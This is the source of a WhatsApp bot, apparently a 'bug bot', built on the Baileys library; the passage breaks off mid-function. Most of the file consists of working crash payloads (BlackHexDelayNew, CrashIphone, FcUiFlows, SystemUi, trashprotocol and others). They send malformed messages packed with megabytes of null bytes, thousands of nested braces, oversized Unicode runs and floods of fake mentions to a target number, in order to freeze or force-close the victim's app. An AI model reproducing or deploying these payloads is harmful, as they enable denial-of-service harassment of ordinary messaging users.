require('./settings/config');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, InteractiveMessage, relayWAMessage,  downloadContentFromMessage } = require("@whiskeysockets/baileys");

const fs = require('fs')
const axios = require('axios')
const yts = require('yt-search')
const fetch = require('node-fetch')
const chalk = require('chalk')
const speed = require('performance-now')
const moment = require('moment-timezone')
const { Sticker } = require('wa-sticker-formatter')
const os = require('os')
const util = require('util')
const { spawn: spawn, exec } = require("child_process")

module.exports = news = async (news, m, chatUpdate, store) => {
try {
// Message type handlers
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
// starting show prefix
const budy = (typeof m.text === 'string' ? m.text : '');
global.prefa = [".", "!", ",", "", "🐤", "🗿"]; // Do Not Change!!
const prefix = global.prefa
    ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
        ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
        : ""
    : global.prefa ?? global.prefix;
// Owner & Premium data
const ownerbot = JSON.parse(fs.readFileSync('./lib/owner.json'));
const Premium = JSON.parse(fs.readFileSync('./lib/premium.json'));
// Sender & bot ID (uniform format)
const sender = m.isGroup
    ? (m.key.participant || m.participant || '')
    : m.key.remoteJid;
const botNumber = (await news.decodeJid(news.user.id)) || '';
// Command detection
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const text = q = args.join(" ");
// Creator & premium checks (uniform format)
const isCreator = [botNumber, ...ownerbot]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
    .includes(sender);
const isPremium = [botNumber, ...Premium]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
    .includes(sender);
// Quoted & group info
const quoted = m.quoted ? m.quoted : m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");
const groupMetadata = isGroup ? await news.groupMetadata(from).catch(() => {}) : {};
const groupName = groupMetadata.subject || '';
const groupMembers = isGroup ? groupMetadata.participants : [];
// Get admins in correct format
const getGroupAdmins = (participants) => {
    const admins = [];
    for (const participant of participants) {
        if (participant.admin === 'admin' || participant.admin === 'superadmin') {
            admins.push(participant.id || participant.jid); // ensure correct property
        }
    }
    return admins;
};
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : [];
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
// FIX: Always count bot owner as admin
const isAdmins = isGroup ? groupAdmins.includes(sender) || isCreator : false;
// sender,time,date,name
const pushname = m.pushName || "No Name"
const senderNumber = sender.split('@')[0];
const time = moment(Date.now()).tz('Africa/Lagos').locale('en').format('HH:mm:ss z');
const mime = (quoted.msg || quoted).mimetype || ''
const dateNG = new Date().toLocaleDateString('en-NG', {
  timeZone: 'Africa/Lagos',
  year: 'numeric',
  month: 'long',
  day: 'numeric'
});
const timeNG = new Date().toLocaleTimeString('en-NG', {
  timeZone: 'Africa/Lagos',
  hour: '2-digit',
  minute: '2-digit',
  second: '2-digit',
  hour12: false
});
const fullDateTime = `Date: ${dateNG} | Time: ${timeNG}`;
const nameowner = "𝚉𝚎𝚗𝚘𝚔 𝙱𝚞𝚐 𝙱𝚘𝚝︎";
if (!news.public) {
if (!isCreator) return 
}
// My Func
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
formatp,
getTime,
getRandom,
sleep } = require('./lib/myfunction');

if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#3498db").bold(`⚙️ 𝕹𝖊𝖜 𝕸𝖊𝖘𝖘𝖆𝖌𝖊`));
console.log(
chalk.bgHex("#FFFFFF").black(
` ╭─ ▢ Date: ${new Date().toLocaleString()} \n` +
` ├─ ▢ Messages: ${m.body || m.mtype} \n` +
` ├─ ▢ Sender: ${m.pushname} \n` +
` ╰─ ▢ Number: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#FFFFFF").black(
` ╭─ ▢ GroupName: ${groupName} \n` +
` ╰─ ▢ Groupid**: ${m.chat}`
)
);
}
console.log();
}

async function BlackHexDelayNew(isTarget, mention) {
    console.log(chalk.red("🦠BlackHex"));

    let payload = "";
    for (let i = 0; i < 900; i++) {
        payload = "\u0000".repeat(2097152);
    }

    const mentionedJid = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
    ];

    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
						url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
						mimetype: "image/jpeg",
						fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
						fileLength: "211396",
						height: 816,
						width: 654,
						mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
						fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
						directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
						mediaKeyTimestamp: "1749220174",
						jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAADBQACBAEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABhB6gNNNTGLcMDiZqB7ZW0LKXPmQBV8PTrzAOOPOOzh1ugQ0IE9MlGMO6SszJlz8K2m4Hs5mG9JBJWQ4aQtvkP/8QAKRAAAgIBAgQEBwAAAAAAAAAAAQIAAxEEIRASEzEUQVJxBSMkQlFTYv/aAAgBAQABPwCzlbcRFyohSFIyQpGY115ni7PyZWQwwdjFGF4EQiFY9YavEK7y2pLFDVneV5KDMM1euKErXDq7z95lfxC1dm3hsFmnDDgtzDYShs1gmMAyEiaul0Yw7Hhp0KaTfz4FuUkyhvkL7Q3tW4AORmalBdWGEtUq5yIhHMM9syx1XTAjtiddoxZicgyvPhlGfKKC7gCarVdABF7y2w2kk9+C3PyFM7cG1L4IAERwmmDN6YdUq2Blmrt6lrGZg3lVBfG88Gn7I9JrfBEZvp8fzDWwMw2cYnTfMpqQrzY3ENirhT3hLZ84yq4wRHXCER7BneGxcY3hsBIMrtIr5V7kxhgp7wIvon//xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAECAQE/ACf/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/ACf/2Q==",
                    contextInfo: {
                        mentionedJid: mentionedJid,
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 2097152,
                        isForwarded: true
                    }
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: payload
                }
            }
        }
    };

    const msg = await generateWAMessageFromContent(isTarget, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "🦠BlackHex" }, // Jangan Dihapus
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function BlankNew(target) {
  const content = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 1,
              expiryTimestamp: null
            }
          },
          externalAdReply: {
            showAdAttribution: false,
            renderLargerThumbnail: true
          },
          header: {
            title: "_ WhatitsDhes - Blank _",
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: 992.999999,
              degreesLongitude: -932.8889989,
              name: "\u900A",
              address: "\u0007".repeat(20000)
            }
          },
          body: {
            text: "_ WhatitsDhes - Blank _"
          },
          interactiveResponseMessage: {
            body: {
              text: "_ WhatitsDhes - Blank_",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              status: true,
              messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
              paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "_ Kipop - Blank _",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "cyber@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(70000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }`,
              version: 3
            }
          }
        }
      }
    }
  };

  const msg = await generateWAMessageFromContent(target, content, {});

  await sock.relayMessage(
    target,
    msg.message,
    { messageId: msg.key.id }
  );
}
async function BoySircle(target) {
const TrazApi = JSON.stringify({
status: true,
active: true,
criador: "$FriendMe",
messageParamsJson: "{".repeat(10000),
call_permission_request: {
status: true,
enabled: true,
version: 3,
},
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: " BlackHex?⒅ # Forclsoe 🦠 ",
hasMediaAttachment: false,
},
body: {
text: " BlackHex?⒅ # Forclsoe 🦠 ",
format: "DEFAULT",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(5000),
buttons: [
{
name: "nested_call_permission",
buttonParamsJson: JSON.stringify({
status: true,
power: "max",
ping: 9999,
cameraAccess: true 
}),
},
],
},
},
},
},
buttons: [
{
name: "nested_crash",
buttonParamsJson: JSON.stringify({
messageParamsJson: "{".repeat(10000),
crash: true,
overdrive: true,
}),
},
{
name: "multi_repeat",
buttonParamsJson: JSON.stringify({
status: true,
payload: Array.from({ length: 100 }, () => "{".repeat(50)),
cameraAccess: true 
}),
},
],
flood: Array.from({ length: 1000 }, () => ({
nulls: "\u0000".repeat(100),
emojis: "🦠".repeat(20),
status: true,
})),
});

const msg = await generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: " BlackHex?⒅ # Forclsoe 🦠 ",
hasMediaAttachment: false,
},
body: {
text:
" BlackHex?⒅ # Forclsoe 🦠  " + "\u0000".repeat(10000),
format: "DEFAULT",
},
nativeFlowMessage: {
messageParamsJson: "{[".repeat(10000),
buttons: [
{
name: "single_select",
buttonParamsJson: TrazApi,
},
...Array.from({ length: 4 }, () => ({
name: "call_permission_request",
buttonParamsJson: JSON.stringify({
status: true,
enabled: true,
overload: true,
cameraAccess: true 
}),
})),
],
},
},
},
},
},
{}
);

await sock.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: { jid: target },
});
}
async function CrashIphone(target) {
  const LocationMessage = {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: " ⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗𝐕𝐄𝐋𝐙͜͢-‣꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/rizxvelzdev",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, LocationMessage, {
    participant: { jid: target }
  });
}
async function FcUiFlows(sock, target) {
  const mentionedJidList = [
    target,
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 2000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const Params = "{[(".repeat(20000);

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            hasMediaAttachment: false
          },
          body: {
            text: "</𖥂 gw Ganteng\\>"
          },
          nativeFlowMessage: {
            messageParamsJson: Params,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "send_location",
                buttonParamsJson: "{}"
              },
              {
                name: "payment_method",
                buttonParamsJson: ""
              },
              {
                name: "form_message",
                buttonParamsJson: ""
              },
              {
                name: "catalog_message",
                buttonParamsJson: ""
              },
              {
                name: "review_and_pay",
                buttonParamsJson: ""
              },
              {
                name: "mpm",
                buttonParamsJson: ""
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            forwardingScore: 250208,
            isForwarded: false,
            mentionedJid: mentionedJidList
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });

  await sleep(1);

  await sock.sendMessage(target, { delete: msg.key });
}
async function iosinVisFC(target, mention) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
         url: `https://rizxvelz-slient.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }

      let extendMsg = {
         extendedTextMessage: { 
            text: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            matchedText: ".Hello Grill...",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      
      let msg1 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      for (const msg of [msg1, msg2]) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     }
   } catch (err) {
      console.error(err);
   }
};
async function protocolbug9(objective, mention) {
  const floods = 2000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedobjectives = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedobjective: mentionedobjectives,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterobjective: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "드림 가이Balz"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(objective, messageContent, { userjid: objective });

  const broadcastSend = {
    messageId: msg.key.id,
    statusobjectiveList: [objective],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: objective }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await sock.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await sock.relayMessage(objective, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
async function SystemUi(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " 𝐔𝐢 𝐒𝐢𝐬𝐭𝐞𝐦 🦠 ",
              hasMediaAttachment: false,
            },
            body: {
              text: " 𝐔𝐢 𝐒𝐢𝐬𝐭𝐞𝐦 🦠 ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{[".repeat(10000),
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0003"
                },
                {
                  name: "single_select",
                  buttonParamsJson: "꧔꧈".repeat(3000)
                },
                {
                  name: "nested_call_permission",
                  buttonParamsJson: JSON.stringify({ status: true })
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ cameraAccess: true })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              "13135550101@s.whatsapp.net",
              "13135550202@s.whatsapp.net",
              "13135550303@s.whatsapp.net",
              "13135550404@s.whatsapp.net",
              "13135550505@s.whatsapp.net",
              "13135550606@s.whatsapp.net",
              "13135550707@s.whatsapp.net",
              "13135550808@s.whatsapp.net",
              "13135550809@s.whatsapp.net",
              "13135551010@s.whatsapp.net"
            ].map(jid => ({
              tag: "to",
              attrs: { jid },
              content: undefined
            }))
          }
        ]
      }
    ]
  });
}
async function trashprotocol(target, mention) {
    const messageX = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "@rizxvelzinfinity",
                    listType: 2,
                    buttonText: null,
                    sections: Array.from({ length: 9741 }, (_, r) => ({ 
                        title: "꧀".repeat(9741),
                        rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                    })),
                    singleSelectReply: { selectedRowId: "🐉" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1900 }, () => 
                            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗̸̷̷̷̋͜͢͜͢͠͡͡𝐕𝐄𝐋𝐙-‣"
                        }
                    },
